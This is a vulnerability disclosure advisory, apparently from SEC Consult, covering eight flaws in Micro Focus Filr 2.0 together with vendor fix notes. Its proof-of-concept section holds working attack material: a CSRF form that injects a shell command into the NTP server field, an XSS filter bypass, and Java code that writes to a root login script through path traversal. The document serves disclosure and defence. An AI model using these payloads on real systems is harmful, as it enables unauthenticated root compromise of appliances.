Vendor description:
-------------------
"Unlike other mobile file access and collaborative file sharing solutions, Micro
Focus Filr has been designed with the enterprise in mind, resulting in less
administration, better security and more productive users."

Business recommendation:
------------------------
During a very quick security check several vulnerabilities with high impact
have been discovered. SEC Consult recommends to immediately apply the patches
provided by Micro Focus to address these issues.

Please note that since SEC Consult did not conduct a thorough technical security
check SEC Consult cannot make a statement regarding the overall security of the
Micro Focus Filr appliance.


Vulnerability overview/description:
-----------------------------------
During a quick security check several vulnerabilities have been identified that
ultimately allow an attacker to completely compromise the appliance:

1) Cross Site Request Forgery (CSRF) - CVE-2016-1607
Several functions within the appliance's administative interface lack protection
against CSRF attacks. This allows an attacker who targets an authenticated
administrator to reconfigure the appliance.

2) OS Command Injection - CVE-2016-1608
The appliance administrative interface allows an authenticated attacker to
execute arbitrary operating system commands. Please note that an attacker can
combine this vulnerability with vulnerability #1. In this scenario, an attacker
does not need to be authenticated.

3) Insecure System Design
The appliance uses a Jetty application server to provide the appliance
administration interface. This application server is started as the superuser
"root". Please note that combined with vulnerability #1 and #2 an attacker can
run commands as the superuser "root" without the need for any authentication.
For vendor remark on #3 see solution section.

4) Persistent Cross-Site Scripting - CVE-2016-1609
The Filr web interface uses a blacklist filter to try to strip any JavaScript
code from user input. However, this filter can be bypassed to persistently
inject JavaScript code into the Filr web interface.

5) Missing Cookie Flags
The httpOnly cookie flag is not set for any session cookies set by both the
administrative appliance web interface and the Filr web interface. Please note
that combined with vulnerability #4 an attacker can steal session cookies of
both the appliance administration interface and the Filr web interface (since
cookies are shared across ports).
For vendor remark on #5 see solution section.

6) Authentication Bypass - CVE-2016-1610
An unauthenticated attacker is able to upload email templates.

7) Path Traversal - CVE-2016-1610
The functionality that allows an administrator to upload email templates fails
to restrict the directory the templates are uploaded to. Please note that
combined with vulnerability #6 an attacker is able to upload arbitray files with
the permissions of the system user "wwwrun".

8) Insecure File Permissions - CVE-2016-1611
A file that is run upon system user login is world-writeable. This allows a local
attacker with restricted privileges to inject commands that are being executed
as privileged users as soon as they log into the system. Please note that
combined with vulnerabilities #6 and #7 an unauthenticated attacker can inject
commands that are executed as privileged system users (e.g. root) using the Filr
web interface.


Proof of concept:
-----------------
1, 2, 3)
The following HTML fragment demonstrates that using a CSRF attack (#1) system
commands can be injected (#2) that are executed as the user root (#3):

----- snip -----
<html>
  <body>
    <form action="https://<host>:9443/vaconfig/time" method="POST">
      <input type="hidden" name="ntpServer" value="0.novell.pool.ntp.org 1.novell.pool.ntp.org';id>/tmp/test;'" />
      <input type="hidden" name="region" value="europe" />
      <input type="hidden" name="timeZone" value="Europe/Vienna" />
      <input type="hidden" name="utc" value="true" />
      <input type="hidden" name="_utc" value="on" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
----- snip -----

4)
The following string demonstrates how the XSS filter can be circumvented:
<img src='>' onerror='alert(1)'>

This string can e.g. be used by a restricted user in the "phone" field of the
user profile. The script is executed by anyone viewing the profile (e.g. admins).

5)
None of the session cookies are set with the httpOnly flag.

6, 7, 8)
The following Java fragment demonstrates how an unauthenticated attacker (#6)
can overwrite a file in the filesystem (#7 & #8) that is executed upon user login
of e.g. the root user:

----- snip -----
String sessionCookie = "sectest";
String host = "http://<host>/";

ProxySettings settings = new ProxySettings();
HttpCookie cookie = new HttpCookie("JSESSIONID", sessionCookie);

settings.setCookieManager(new CookieManager());
settings.getCookieManager().getCookieStore().add(new URI(host), cookie);

settings.setModuleBaseUrl(host + "ssf/gwt/");
settings.setRemoteServiceRelativePath("gwtTeaming.rpc");
settings.setPolicyName("338D4038939D10E7FC021BD64B318D99");
GwtRpcService svc = SyncProxy.createProxy(GwtRpcService.class, settings);

VibeXsrfToken token = new VibeXsrfToken(
		StringUtils.toHexString(Md5Utils.getMd5Digest(sessionCookie.getBytes())));
((HasRpcToken) svc).setRpcToken(token);

String fileName = "../../../../etc/profile.d/vainit.sh";
FileBlob fileBlob = new FileBlob(ReadType.TEXT, fileName, "", 1l, 4, 1l, false, 4l);
fileBlob.setBlobDataString("id > /tmp/profiledtest\n");
BinderInfo folderInfo = new BinderInfo();
folderInfo.setBinderId((long) 1);
folderInfo.setBinderType(BinderType.WORKSPACE);
folderInfo.setWorkspaceType(WorkspaceType.EMAIL_TEMPLATES);
VibeRpcCmd cmd = new UploadFileBlobCmd(folderInfo, fileBlob, true);
HttpRequestInfo ri = new HttpRequestInfo();
svc.executeCommand(ri, cmd);
----- snip -----

-----------------------------
The version 2.0.0.421 of Micro Focus Filr was found to be vulnerable. This version
was the latest version at the time of the discovery.

According to the vendor, Filr 1.2 is also vulnerable.

Solution:
---------
The "Filr 2.0 Security Update 2" can be downloaded here and should

Issue #2: https://www.novell.com/support/kb/doc.php?id=7017789
Issue #4: https://www.novell.com/support/kb/doc.php?id=7017787
Issue #6 & #7: https://www.novell.com/support/kb/doc.php?id=7017788

Local privilege escalation via insecure file permissions (#8) has
already been fixed in the Filr 2.0 security update 1 in June:
https://www.novell.com/support/kb/doc.php?id=7017689


Issue #3: According to Micro Focus, Jetty actually runs as user
"vabase-jetty" but will pass commands off to another service on
the box that runs as root to perform privileged actions.
They have fixed the command injection in this release and the
next release will include much more stringent parameter validation
for passing the commands.

Issue #5: According to Micro Focus, a component of Filr does not
function properly when the httpOnly flag is enabled. This will be
addressed in a future release.


Workaround:
-----------
None
